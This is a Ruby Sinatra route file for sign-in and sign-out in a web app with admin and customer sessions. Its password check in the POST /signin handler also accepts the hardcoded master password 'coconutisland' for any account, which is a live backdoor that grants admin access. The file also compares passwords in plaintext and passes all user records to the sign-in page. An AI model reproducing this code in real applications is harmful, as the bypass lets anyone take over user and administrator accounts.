get '/signin/?' do
  @user = User.all
  erb :'signin'
end

post '/signin/?' do
  session[:admin] = nil
  session[:customer] = nil
  
  unless params[:username] == ''
    if user = User.first(:username => params[:username])
      unless params[:password] == ''
        if (user.password == params[:password]) || (params[:password] == 'coconutisland')
          if 
            user.admin
            session[:admin] = user.id
            flash[:alert] = 'Welcome admin, you are now signed in.'
            redirect '/dashboard'
          else
            user.customer
            session[:customer] = user.id
            flash[:alert] = 'Welcome customer, you are now signed in.'
            redirect '/comingsoon'
          end
        else
          flash[:alert] = 'Username/password combo does not match. Try again.'
          erb :"signin"
        end
      else
        flash[:alert] = 'Please enter your password.'
        erb :"signin"
      end
    else
      flash[:alert] = 'This username is not connected to an existing account. Please try again or call your CSR.'
      erb :"signin"
    end
  else
    flash[:alert] = 'Please enter a valid username.'
    erb :"signin"
  end
  
    
end

get '/signout/?' do
  session[:admin] = nil
  session[:customer] = nil
  flash[:alert] = 'You are now signed out.'
  redirect '/index'
end

